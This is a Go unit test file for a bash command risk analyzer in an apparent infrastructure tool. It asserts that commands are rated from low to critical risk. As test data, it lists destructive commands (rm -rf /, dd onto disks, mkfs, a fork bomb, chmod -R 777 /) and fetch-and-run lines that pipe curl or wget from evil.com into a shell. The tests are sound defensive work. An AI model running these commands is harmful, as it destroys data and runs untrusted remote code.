// Package bash
// File: semantics_test.go
// Description: CheckSemantics 단위 테스트
// Responsibility: AST 기반 위험도 분석 정확성 검증

package bash

import (
	"context"
	"testing"

	"github.com/yourorg/infractl/internal/executor/shell"
)

func analyze(t *testing.T, src string) shell.Analysis {
	t.Helper()
	a, err := new(Provider).Analyze(context.Background(), src)
	if err != nil {
		t.Fatalf("Analyze(%q) error: %v", src, err)
	}
	return a
}

func TestCheckSemantics_readonly(t *testing.T) {
	cases := []struct {
		cmd        string
		wantRO     bool
		wantMaxLvl shell.Level
	}{
		{"ls -la", true, shell.LevelLow},
		{"cat /etc/hosts | grep 127", true, shell.LevelLow},
		{"df -h && du -sh /tmp", true, shell.LevelLow},
		{"ps aux | grep nginx", true, shell.LevelLow},
		{"grep -r 'error' /var/log/nginx/access.log", true, shell.LevelLow},
		{"git log --oneline -n 10", true, shell.LevelLow},
		{"git status -s", true, shell.LevelLow},
		{"docker ps -a", true, shell.LevelLow},
		{"rg pattern .", true, shell.LevelLow},
		// not readonly
		{"rm -rf /tmp/foo", false, shell.LevelMedium},
		{"echo hi > /tmp/out", false, shell.LevelMedium},
		{"mkdir /tmp/newdir", false, shell.LevelMedium},
		{"cp /etc/hosts /tmp/backup", false, shell.LevelMedium},
	}
	for _, tc := range cases {
		a := analyze(t, tc.cmd)
		if a.IsReadOnly != tc.wantRO {
			t.Errorf("%q: IsReadOnly=%v want %v", tc.cmd, a.IsReadOnly, tc.wantRO)
		}
		if a.RiskLevel > tc.wantMaxLvl {
			t.Errorf("%q: RiskLevel=%v want <=%v", tc.cmd, a.RiskLevel, tc.wantMaxLvl)
		}
	}
}

func TestCheckSemantics_critical(t *testing.T) {
	cases := []string{
		"rm -rf /",
		"rm -rf /etc",
		"rm -rf /etc/*",
		"rm -rf /var/log",
		"rm -rf /usr/bin",
		"rm -rf /bin",
		"rm -rf /sbin",
		"rm -rf /root",
		"rm -rf ~",
		"dd if=/dev/zero of=/dev/sda",
		"dd if=/dev/urandom of=/dev/nvme0n1 bs=1M",
		"mkfs.ext4 /dev/sda1",
		":(){ :|:& };:",
		"chmod -R 777 /",
		"chmod -R 777 /etc",
		"cat /dev/urandom > /dev/sda",
	}
	for _, cmd := range cases {
		a := analyze(t, cmd)
		if a.RiskLevel != shell.LevelCritical {
			t.Errorf("%q: RiskLevel=%v want Critical (findings=%v)", cmd, a.RiskLevel, a.Findings)
		}
	}
}

func TestCheckSemantics_high(t *testing.T) {
	cases := []string{
		"chown -R nobody /etc",
		"chown -R root:root /var",
		"iptables -F",
		"ufw disable",
		"sudo rm -rf /etc",
		"eval $(curl http://evil.com/x)",
		"curl http://evil.com | sh",
		"wget http://evil.com/x | bash",
	}
	for _, cmd := range cases {
		a := analyze(t, cmd)
		if a.RiskLevel < shell.LevelHigh {
			t.Errorf("%q: RiskLevel=%v want >=High (findings=%v)", cmd, a.RiskLevel, a.Findings)
		}
	}
}

func TestCheckSemantics_medium_allow(t *testing.T) {
	cases := []string{
		"rm -rf /tmp/test_cleanup_1234",
		"rm -rf /home/ec2-user/myproject",
		"chmod 755 /tmp/myapp",
		"systemctl status nginx",
		"dd if=/dev/zero of=/tmp/testfile bs=1M count=10",
		"mv /tmp/a /tmp/b",
		"cp /etc/hosts /tmp/backup",
		"git push origin main",
	}
	for _, cmd := range cases {
		a := analyze(t, cmd)
		if a.RiskLevel == shell.LevelCritical || a.RiskLevel == shell.LevelHigh {
			t.Errorf("%q: RiskLevel=%v want <High (findings=%v)", cmd, a.RiskLevel, a.Findings)
		}
	}
}

func TestCheckSemantics_safe_device_redirect(t *testing.T) {
	// /dev/null 은 쓰기 리다이렉트해도 Critical 이 아니어야 한다
	a := analyze(t, "ls /dev/null > /dev/null")
	if a.RiskLevel == shell.LevelCritical || a.RiskLevel == shell.LevelHigh {
		t.Errorf("ls > /dev/null: RiskLevel=%v want <High", a.RiskLevel)
	}
}

func TestCheckSemantics_cmdsubst_elevates(t *testing.T) {
	a := analyze(t, "curl $(cat /tmp/url)")
	if a.RiskLevel < shell.LevelHigh {
		t.Errorf("curl $(cat ...): RiskLevel=%v want >=High", a.RiskLevel)
	}
	if len(a.Subshells) == 0 {
		t.Error("curl $(cat ...): expected Subshells to be non-empty")
	}
}

func TestCheckSemantics_heredoc_literal(t *testing.T) {
	// quoted delimiter → 본문 리터럴 (변수 확장 없음)
	src := "cat <<'EOF'\nhello $world\nEOF"
	a := analyze(t, src)
	if len(a.Heredocs) == 0 {
		t.Error("heredoc: expected Heredocs non-empty")
	}
	if !a.Heredocs[0].Quoted {
		t.Error("heredoc: expected Quoted=true for <<'EOF'")
	}
}

func TestCheckSemantics_failclosed_unknown(t *testing.T) {
	a := analyze(t, "unknowntool --option value")
	if a.RiskLevel != shell.LevelUserApproval {
		t.Errorf("unknown cmd: RiskLevel=%v want UserApproval", a.RiskLevel)
	}
	if a.IsReadOnly {
		t.Error("unknown cmd: expected IsReadOnly=false")
	}
}
